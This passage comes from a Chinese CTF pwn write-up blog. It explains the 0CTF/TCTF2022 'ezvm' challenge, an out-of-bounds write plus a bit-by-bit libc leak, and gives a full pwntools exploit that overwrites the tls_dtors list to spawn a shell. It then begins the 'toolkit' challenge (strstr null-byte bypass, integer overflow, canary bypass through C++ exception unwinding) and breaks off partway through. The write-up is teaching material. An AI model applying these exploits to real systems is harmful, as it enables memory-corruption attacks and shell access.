class="number">233</span>);</span><br><span class="line">other070(<span class="number">233</span>);</span><br><span class="line">other071(<span class="number">233</span>);</span><br><span class="line">other072(<span class="number">233</span>);</span><br><span class="line">other073(<span class="number">233</span>);</span><br><span class="line">other074(<span class="number">233</span>);</span><br><span class="line">other075(<span class="number">233</span>);</span><br><span class="line">other076(<span class="number">233</span>);</span><br><span class="line">other077(<span class="number">233</span>);</span><br><span class="line">other078(<span class="number">233</span>);</span><br><span class="line">other079(<span class="number">233</span>);</span><br><span class="line">other080(<span class="number">233</span>);</span><br><span class="line">other081(<span class="number">233</span>);</span><br><span class="line">other082(<span class="number">233</span>);</span><br><span class="line">other083(<span class="number">233</span>);</span><br><span class="line">other084(<span class="number">233</span>);</span><br><span class="line">other085(<span class="number">233</span>);</span><br><span class="line">other086(<span class="number">233</span>);</span><br><span class="line">other087(<span class="number">233</span>);</span><br><span class="line">other088(<span class="number">233</span>);</span><br><span class="line">other089(<span class="number">233</span>);</span><br><span class="line">other090(<span class="number">233</span>);</span><br><span class="line">other091(<span class="number">233</span>);</span><br><span class="line">other092(<span class="number">233</span>);</span><br><span class="line">other093(<span class="number">233</span>);</span><br><span class="line">other094(<span class="number">233</span>);</span><br><span class="line">other095(<span class="number">233</span>);</span><br><span class="line">other096(<span class="number">233</span>);</span><br><span class="line">other097(<span class="number">233</span>);</span><br><span class="line">other098(<span class="number">233</span>);</span><br><span class="line">other099(<span class="number">233</span>);</span><br><span class="line">other100(<span class="number">233</span>);</span><br><span class="line">other101(<span class="number">233</span>);</span><br><span class="line">other102(<span class="number">233</span>);</span><br><span class="line">other103(<span class="number">233</span>);</span><br><span class="line">other104(<span class="number">233</span>);</span><br><span class="line">other105(<span class="number">233</span>);</span><br><span class="line">other106(<span class="number">233</span>);</span><br><span class="line">other107(<span class="number">233</span>);</span><br><span class="line">other108(<span class="number">233</span>);</span><br><span class="line">other109(<span class="number">233</span>);</span><br><span class="line">other110(<span class="number">233</span>);</span><br><span class="line">other111(<span class="number">233</span>);</span><br><span class="line">other112(<span class="number">233</span>);</span><br><span class="line">other113(<span class="number">233</span>);</span><br><span class="line">other114(<span class="number">233</span>);</span><br><span class="line">other115(<span class="number">233</span>);</span><br><span class="line">other116(<span class="number">233</span>);</span><br><span class="line">other117(<span class="number">233</span>);</span><br><span class="line">other118(<span class="number">233</span>);</span><br><span class="line">other119(<span class="number">233</span>);</span><br><span class="line">other120(<span class="number">233</span>);</span><br><span class="line">other121(<span class="number">233</span>);</span><br><span class="line">other122(<span class="number">233</span>);</span><br><span class="line">other123(<span class="number">233</span>);</span><br><span class="line">other124(<span class="number">233</span>);</span><br><span class="line">other125(<span class="number">233</span>);</span><br><span class="line">other126(<span class="number">233</span>);</span><br><span class="line">other127(<span class="number">233</span>);</span><br><span class="line">other128(<span class="number">233</span>);</span><br><span class="line">other129(<span class="number">233</span>);</span><br><span class="line">other130(<span class="number">233</span>);</span><br><span class="line">other131(<span class="number">233</span>);</span><br><span class="line">other132(<span class="number">233</span>);</span><br><span class="line">other133(<span class="number">233</span>);</span><br><span class="line">other134(<span class="number">233</span>);</span><br><span class="line">other135(<span class="number">233</span>);</span><br><span class="line">other136(<span class="number">233</span>);</span><br><span class="line">other137(<span class="number">233</span>);</span><br><span class="line">other138(<span class="number">233</span>);</span><br><span class="line">other139(<span class="number">233</span>);</span><br><span class="line">other140(<span class="number">233</span>);</span><br><span class="line">other141(<span class="number">233</span>);</span><br><span class="line">other142(<span class="number">233</span>);</span><br><span class="line">other143(<span class="number">233</span>);</span><br><span class="line">other144(<span class="number">233</span>);</span><br><span class="line">other145(<span class="number">233</span>);</span><br><span class="line">other146(<span class="number">233</span>);</span><br><span class="line">other147(<span class="number">233</span>);</span><br><span class="line">other148(<span class="number">233</span>);</span><br><span class="line">other149(<span class="number">233</span>);</span><br><span class="line">other150(<span class="number">233</span>);</span><br><span class="line">other151(<span class="number">233</span>);</span><br><span class="line">other152(<span class="number">233</span>);</span><br><span class="line">other153(<span class="number">233</span>);</span><br><span class="line">other154(<span class="number">233</span>);</span><br><span class="line">other155(<span class="number">233</span>);</span><br><span class="line">other156(<span class="number">233</span>);</span><br><span class="line">other157(<span class="number">233</span>);</span><br><span class="line">other158(<span class="number">233</span>);</span><br><span class="line">other159(<span class="number">233</span>);</span><br><span class="line">other160(<span class="number">233</span>);</span><br><span class="line">other161(<span class="number">233</span>);</span><br><span class="line">other162(<span class="number">233</span>);</span><br><span class="line">other163(<span class="number">233</span>);</span><br><span class="line">other164(<span class="number">233</span>);</span><br><span class="line">other165(<span class="number">233</span>);</span><br><span class="line">other166(<span class="number">233</span>);</span><br><span class="line">other167(<span class="number">233</span>);</span><br><span class="line">other168(<span class="number">233</span>);</span><br><span class="line">other169(<span class="number">233</span>);</span><br><span class="line">other170(<span class="number">233</span>);</span><br><span class="line">other171(<span class="number">233</span>);</span><br><span class="line">other172(<span class="number">233</span>);</span><br><span class="line">other173(<span class="number">233</span>);</span><br><span class="line">other174(<span class="number">233</span>);</span><br><span class="line">other175(<span class="number">233</span>);</span><br><span class="line">other176(<span class="number">233</span>);</span><br><span class="line">other177(<span class="number">233</span>);</span><br><span class="line">other178(<span class="number">233</span>);</span><br><span class="line">other179(<span class="number">233</span>);</span><br><span class="line">other180(<span class="number">233</span>);</span><br><span class="line">other181(<span class="number">233</span>);</span><br><span class="line">other182(<span class="number">233</span>);</span><br><span class="line">other183(<span class="number">233</span>);</span><br><span class="line">other184(<span class="number">233</span>);</span><br><span class="line">other185(<span class="number">233</span>);</span><br><span class="line">other186(<span class="number">233</span>);</span><br><span class="line">other187(<span class="number">233</span>);</span><br><span class="line">other188(<span class="number">233</span>);</span><br><span class="line">other189(<span class="number">233</span>);</span><br><span class="line">other190(<span class="number">233</span>);</span><br><span class="line">other191(<span class="number">233</span>);</span><br><span class="line">other192(<span class="number">233</span>);</span><br><span class="line">other193(<span class="number">233</span>);</span><br><span class="line">other194(<span class="number">233</span>);</span><br><span class="line">other195(<span class="number">233</span>);</span><br><span class="line">other196(<span class="number">233</span>);</span><br><span class="line">other197(<span class="number">233</span>);</span><br><span class="line">other198(<span class="number">233</span>);</span><br><span class="line">other199(<span class="number">233</span>);</span><br><span class="line">other200(<span class="number">233</span>);</span><br><span class="line">other201(<span class="number">233</span>);</span><br><span class="line">other202(<span class="number">233</span>);</span><br><span class="line">other203(<span class="number">233</span>);</span><br><span class="line">other204(<span class="number">233</span>);</span><br><span class="line">other205(<span class="number">233</span>);</span><br><span class="line">other206(<span class="number">233</span>);</span><br><span class="line">other207(<span class="number">233</span>);</span><br><span class="line">other208(<span class="number">233</span>);</span><br><span class="line">other209(<span class="number">233</span>);</span><br><span class="line">other210(<span class="number">233</span>);</span><br><span class="line">other211(<span class="number">233</span>);</span><br><span class="line">other212(<span class="number">233</span>);</span><br><span class="line">other213(<span class="number">233</span>);</span><br><span class="line">other214(<span class="number">233</span>);</span><br><span class="line">other215(<span class="number">233</span>);</span><br><span class="line">other216(<span class="number">233</span>);</span><br><span class="line">other217(<span class="number">233</span>);</span><br><span class="line">other218(<span class="number">233</span>);</span><br><span class="line">other219(<span class="number">233</span>);</span><br><span class="line">other220(<span class="number">233</span>);</span><br><span class="line">other221(<span class="number">233</span>);</span><br><span class="line">other222(<span class="number">233</span>);</span><br><span class="line">other223(<span class="number">233</span>);</span><br><span class="line">other224(<span class="number">233</span>);</span><br><span class="line">other225(<span class="number">233</span>);</span><br><span class="line">other226(<span class="number">233</span>);</span><br><span class="line">other227(<span class="number">233</span>);</span><br><span class="line">other228(<span class="number">233</span>);</span><br><span class="line">other229(<span class="number">233</span>);</span><br><span class="line">other230(<span class="number">233</span>);</span><br><span class="line">other231(<span class="number">233</span>);</span><br><span class="line">other232(<span class="number">0xec</span>);</span><br><span class="line">other233(<span class="number">0xfd</span>);</span><br><span class="line">other234(<span class="number">0x6f</span>);</span><br><span class="line">other235(<span class="number">0</span>);</span><br><span class="line">other236(<span class="number">0</span>);</span><br><span class="line">other237(<span class="number">0</span>);</span><br><span class="line">other238(<span class="number">0</span>);</span><br><span class="line">other239(<span class="number">0</span>);</span><br><span class="line">other240(<span class="number">0</span>);</span><br><span class="line">other241(<span class="number">0</span>);</span><br><span class="line">other242(<span class="number">0x40</span>);</span><br><span class="line">other243(<span class="number">233</span>);</span><br><span class="line">other244(<span class="number">233</span>);</span><br><span class="line">other245(<span class="number">233</span>);</span><br><span class="line">other246(<span class="number">233</span>);</span><br><span class="line">other247(<span class="number">233</span>);</span><br><span class="line">other248(<span class="number">233</span>);</span><br><span class="line">other249(<span class="number">233</span>);</span><br><span class="line">other250(<span class="number">233</span>);</span><br><span class="line">other251(<span class="number">233</span>);</span><br><span class="line">other252(<span class="number">233</span>);</span><br><span class="line">other253(<span class="number">233</span>);</span><br><span class="line">other254(<span class="number">233</span>);</span><br><span class="line">other255(<span class="number">233</span>);</span><br><span class="line">other232(<span class="number">0xec</span>);</span><br><span class="line">other233(<span class="number">0xfd</span>);</span><br><span class="line">other234(<span class="number">0x6f</span>);</span><br><span class="line">    other240(<span class="number">0</span>);</span><br><span class="line">other241(<span class="number">0</span>);</span><br><span class="line">other242(<span class="number">0x40</span>);</span><br><span class="line">fight(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="0x10-0CTF-TCTF2022-ezvm-【虚拟机逆向，侧信道泄露数据，任意地址写】"><a href="#0x10-0CTF-TCTF2022-ezvm-【虚拟机逆向，侧信道泄露数据，任意地址写】" class="headerlink" title="0x10.0CTF&#x2F;TCTF2022 ezvm 【虚拟机逆向，侧信道泄露数据，任意地址写】"></a>0x10.0CTF&#x2F;TCTF2022 ezvm 【虚拟机逆向，侧信道泄露数据，任意地址写】</h2><p><a href="https://imgse.com/i/xABrSU"><img src="https://s1.ax1x.com/2022/09/24/xABrSU.png" alt="xABrSU.png"></a></p><p>一道可以多次输入的vmpwn</p><p>vm的结构体大概如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">vm</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">char</span> *code;</span><br><span class="line">  <span class="type">int64_t</span> *memory;</span><br><span class="line">  <span class="type">int64_t</span> *<span class="built_in">stack</span>;</span><br><span class="line">  <span class="type">int64_t</span> codesize;</span><br><span class="line">  <span class="type">int64_t</span> memcnt;</span><br><span class="line">  <span class="type">int64_t</span> regs[<span class="number">4</span>];</span><br><span class="line">  <span class="type">int64_t</span> rip;</span><br><span class="line">  <span class="type">int64_t</span> rsp;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><a href="https://imgse.com/i/xABRT1"><img src="https://s1.ax1x.com/2022/09/24/xABRT1.png" alt="xABRT1.png"></a></p><p>在这里，当输入类似<code>0x2000000000000020</code>的<code>mem_cnt</code>时，后续申请到的memory大小就为<code>0x100</code></p><p><a href="https://imgse.com/i/xABq0A"><img src="https://s1.ax1x.com/2022/09/24/xABq0A.png" alt="xABq0A.png"></a></p><p>在执行opcode时，0x15功能点处检查内存是否越界依然使用的是一开始输入的mem_cnt，因此存在越界写，可以将寄存器中的数据写到任意内存中。而在0x16功能点处的内存读功能则由于<code>v8 &gt;= 8 * vmx.memcnt / 8</code>的处理，失去了越界读的效果，所以题目的漏洞就在于0x15功能点的越界写。</p><p><a href="https://imgse.com/i/xAD0HA"><img src="https://s1.ax1x.com/2022/09/24/xAD0HA.png" alt="xAD0HA.png"></a></p><p>当opcode大于0x17时，会输出<code>what???</code>，可以根据这个构造盲注来泄露libc地址</p><p>首先将libc地址push到栈上，然后将<code>1&lt;&lt;i(5&lt;=i&lt;40)</code>也push到栈上</p><p>然后通过0x9的按位与功能</p><p><a href="https://imgse.com/i/xADc38"><img src="https://s1.ax1x.com/2022/09/24/xADc38.png" alt="xADc38.png"></a></p><p>检测该位是否为1，如果为1的话就执行一个错误的opcode，输出<code>what???</code>，如果为0的话就跳转回code开头，继续测试下一位是否为1，由此可以一位一位地得到libc地址。代码如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">leak=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>,<span class="number">40</span>,<span class="number">1</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;leaking bit&quot;</span>+<span class="built_in">str</span>(i)+<span class="string">&#x27;:&#x27;</span>+<span class="built_in">str</span>(<span class="built_in">bin</span>(<span class="number">1</span>&lt;&lt;i)))</span><br><span class="line">    code=p8(<span class="number">0x16</span>)+p8(<span class="number">0</span>)+p64(<span class="number">0</span>) <span class="comment">#mov reg[0],mem[0] 将内存中的一个数据，也就是libc地址mov至r0中</span></span><br><span class="line">    code+=p8(<span class="number">0</span>)+p8(<span class="number">0</span>) <span class="comment">#push r0 将libc地址push到栈上</span></span><br><span class="line">    code+=p8(<span class="number">0x14</span>)+p8(<span class="number">1</span>)+p64(<span class="number">1</span>&lt;&lt;i) <span class="comment">#mov reg[1],1&lt;&lt;i 将1&lt;&lt;i送入r1中,i为5时，即100000</span></span><br><span class="line">    code+=p8(<span class="number">0</span>)+p8(<span class="number">1</span>) <span class="comment">#push r1 将r1 push到栈上</span></span><br><span class="line">    code+=p8(<span class="number">0x9</span>) <span class="comment">#AND r0=r0&amp;r1</span></span><br><span class="line">    code+=p8(<span class="number">0x10</span>)+p64(<span class="number">1</span>) <span class="comment">#如果r0为1,就执行0x18这个opcode，如果不为1，就执行0x17这条opcode</span></span><br><span class="line">    code+=p8(<span class="number">0x18</span>)+p8(<span class="number">0x17</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;size:\n&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(<span class="built_in">len</span>(code)))</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;memory count:\n&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">&#x27;256&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;code:\n&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    io.sendline(code)</span><br><span class="line">    data=io.recvuntil(<span class="string">&#x27;finish!\n&#x27;</span>,drop=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;what&#x27;</span> <span class="keyword">in</span> data:</span><br><span class="line">        leak|=(<span class="number">1</span>&lt;&lt;i)</span><br><span class="line"></span><br><span class="line">leak|=<span class="number">0x7f0000000000</span></span><br></pre></td></tr></table></figure><p>opcode为0x10时，操作如下</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230201152626237.png" alt="image-20230201152626237"></p><p>这里检查栈顶是否为0，不为0的话就继续往下执行，为0的话就跳转到v12继续执行。v12为当前指令的地址加上一个偏移量。</p><p>拿到libc地址后，再加上任意地址写，随便怎么打都可以，这里采用打<code>call_tls_dtors</code>来getshell</p><p>exp如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">io=process(<span class="string">&#x27;./ezvm&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.35.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Welcome to 0ctf2022!!\n&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;lock&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;size:\n&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;38&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;memory count:\n&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;256&#x27;</span>)</span><br><span class="line">code=p8(<span class="number">0x17</span>)+p8(<span class="number">0xff</span>)*<span class="number">36</span></span><br><span class="line">io.recvuntil(<span class="string">&#x27;code:\n&#x27;</span>)</span><br><span class="line">io.sendline(code)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;continue?\n&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;y&#x27;</span>)</span><br><span class="line"></span><br><span class="line">leak=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>,<span class="number">40</span>,<span class="number">1</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;leaking bit&quot;</span>+<span class="built_in">str</span>(i)+<span class="string">&#x27;:&#x27;</span>+<span class="built_in">str</span>(<span class="built_in">bin</span>(<span class="number">1</span>&lt;&lt;i)))</span><br><span class="line">    code=p8(<span class="number">0x16</span>)+p8(<span class="number">0</span>)+p64(<span class="number">0</span>) <span class="comment">#mov reg[0],mem[0]</span></span><br><span class="line">    code+=p8(<span class="number">0</span>)+p8(<span class="number">0</span>) <span class="comment">#push r0</span></span><br><span class="line">    code+=p8(<span class="number">0x14</span>)+p8(<span class="number">1</span>)+p64(<span class="number">1</span>&lt;&lt;i) <span class="comment">#mov reg[1],1&lt;&lt;i</span></span><br><span class="line">    code+=p8(<span class="number">0</span>)+p8(<span class="number">1</span>) <span class="comment">#push r1</span></span><br><span class="line">    code+=p8(<span class="number">0x9</span>) <span class="comment">#AND</span></span><br><span class="line">    code+=p8(<span class="number">0x10</span>)+p64(<span class="number">1</span>)</span><br><span class="line">    code+=p8(<span class="number">0x18</span>)+p8(<span class="number">0x17</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;size:\n&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(<span class="built_in">len</span>(code)))</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;memory count:\n&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">&#x27;256&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;code:\n&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    io.sendline(code)</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line">    data=io.recvuntil(<span class="string">&#x27;finish!\n&#x27;</span>,drop=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;what&#x27;</span> <span class="keyword">in</span> data:</span><br><span class="line">        leak|=(<span class="number">1</span>&lt;&lt;i)</span><br><span class="line"></span><br><span class="line">leak|=<span class="number">0x7f0000000000</span></span><br><span class="line">log.success(<span class="string">&#x27;leak =&gt; &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(leak)))</span><br><span class="line">libc_base=leak-<span class="number">0x219ce0</span></span><br><span class="line">system_addr=libc_base+libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh_addr=libc_base+libc.search(<span class="string">&#x27;/bin/sh\x00&#x27;</span>).<span class="built_in">next</span>()</span><br><span class="line">tls_dtor_list_addr=libc_base-<span class="number">0x28c0</span>-<span class="number">0x58</span></span><br><span class="line">log.success(<span class="string">&#x27;libc_base =&gt; &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(libc_base)))</span><br><span class="line">log.success(<span class="string">&#x27;system_addr =&gt; &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(system_addr)))</span><br><span class="line">log.success(<span class="string">&#x27;binsh_addr =&gt; &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(binsh_addr)))</span><br><span class="line"></span><br><span class="line">size = <span class="number">0x2000000000030000</span></span><br><span class="line">io.recvuntil(<span class="string">&#x27;size:\n&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;100&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;memory count:\n&#x27;</span>)</span><br><span class="line">io.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">code=p8(<span class="number">0x15</span>)+p8(<span class="number">0</span>)+p64(<span class="number">0x302ec</span>) <span class="comment">#mov mem[0x302eb],reg[0]</span></span><br><span class="line">enc=((system_addr^<span class="number">0</span>)&gt;&gt;(<span class="number">64</span>-<span class="number">0x11</span>))|((system_addr^<span class="number">0</span>)&lt;&lt;<span class="number">0x11</span>)</span><br><span class="line">code+=p8(<span class="number">0x14</span>)+p8(<span class="number">1</span>)+p64(enc) <span class="comment">#mov reg[1],system_addr</span></span><br><span class="line">code+=p8(<span class="number">0x14</span>)+p8(<span class="number">2</span>)+p64(binsh_addr) <span class="comment">#mov reg[2],binsh_addr</span></span><br><span class="line">code+=p8(<span class="number">0x14</span>)+p8(<span class="number">3</span>)+p64(libc_base+<span class="number">0x220000</span>) <span class="comment">#mov reg[3],libc_base+0x220000</span></span><br><span class="line">code+=p8(<span class="number">0x15</span>)+p8(<span class="number">3</span>)+p64(<span class="number">0x302db</span>)</span><br><span class="line">code+=p8(<span class="number">0x15</span>)+p8(<span class="number">1</span>)+p64(<span class="number">0x747fe</span>)  </span><br><span class="line">code+=p8(<span class="number">0x15</span>)+p8(<span class="number">2</span>)+p64(<span class="number">0x747ff</span>) </span><br><span class="line">io.recvuntil(<span class="string">&#x27;code:\n&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">io.sendline(code)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;continue?\n&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;bye bye&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="0x11-第五空间2022-toolkit-【strstr空字符截断，整数溢出，c-异常捕获】"><a href="#0x11-第五空间2022-toolkit-【strstr空字符截断，整数溢出，c-异常捕获】" class="headerlink" title="0x11.第五空间2022 toolkit 【strstr空字符截断，整数溢出，c++异常捕获】"></a>0x11.第五空间2022 toolkit 【strstr空字符截断，整数溢出，c++异常捕获】</h2><p>这是一道考察c++知识点的题目</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230201172300580.png" alt="image-20230201172300580"></p><p>有这么些功能，还有一个额外的功能</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230201172332866.png" alt="image-20230201172332866"></p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230201172342944.png" alt="image-20230201172342944"></p><p>从<code>/dev/urandom</code>中读取0x30个字节，然后再从标准输入读取0x250个字节到password，然后再从password中查找是否有刚刚读取的那0x30个随机数，如果有的话就输出一个.text段的地址，可以得到程序加载的基地址。</p><p>在这里进行查找使用的是<code>strstr</code>函数，这个函数会被<code>\x00</code>截断掉，所以如果随机数的开头是<code>\x00</code>就可以绕过检查，那么，随机读取0x30个字符，开头为<code>\x00</code>的几率有多大，可以使用下面的程序来测试</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">64</span>];</span><br><span class="line">    <span class="type">int</span> count = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="number">64</span>);</span><br><span class="line">        <span class="type">int</span> fd = open(<span class="string">&quot;/dev/urandom&quot;</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> ( fd &lt; <span class="number">0</span> )</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;Error!&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        read(fd, buf, <span class="number">0x30</span>uLL);</span><br><span class="line">        close(fd);</span><br><span class="line">        <span class="keyword">if</span>(buf[<span class="number">0</span>] == <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d: found: %d\n&quot;</span>, count, buf[<span class="number">0</span>]);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d: failed: %d\n&quot;</span>, count++, buf[<span class="number">0</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/202403101134754.png" alt="image-20230201173334147"></p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230201173428907.png" alt="image-20230201173428907"></p><p>至多几百次，至少十来次即可得到开头为<code>\x00</code>的随机数，所以我们只需要多次运行这个程序就有几率绕过检查。</p><p>在tool2的func2功能中，存在一个整数溢出漏洞</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230201174449126.png" alt="image-20230201174449126"></p><p>这里的num可以为负数，在read_str函数中</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230201174629091.png" alt="image-20230201174629091"></p><p>每次将num减一，当num为0时退出read_str函数，如果我们输入的值为负数，那么就可以实现一个无限读取。</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230201185707436.png" alt="image-20230201185707436"></p><p>读取key，如果key的长度不为16，就会抛出一个异常。这里涉及到c++的异常抛出捕获机制</p><p>在IDA的汇编代码处可以看到try和catch关键字，在伪代码中看不到</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230201190311332.png" alt="image-20230201190311332"></p><p>整个tool2函数都在try的代码块中，即tool2中的异常将会被捕获。在异常被抛出捕获且正确处理后，为了所有生命期已结束的对象都会被正确地析构，它们所占用的空间会被正确地回收，会触发栈回退（Stack Unwind）机制。</p><p>由于在func2中抛出的异常没有相应的catch来捕获异常，所以会触发栈回退顺着函数调用链往上，直到有catch来捕获异常</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20231128140849371.png" alt="image-20231128140849371"></p><p>在tool2中存在catch，func2中的异常会在tool2中被捕获，异常处理结束之后，会执行<code>add     rsp, 18h，pop     rbx，pop     rbp，ret</code>，而不是func2的返回语句，这样一来就跳过了canary的检查。</p><p>怎么构造payload呢？</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/202403101137779.png" alt="image-20231128145329992"></p><p>由于这里会将rax赋值给[rbp-0x18]，所以在构造payload时应该将rbp设置为一个可写地址，在后续异常处理结束的ret之前</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/202403101137782.png" 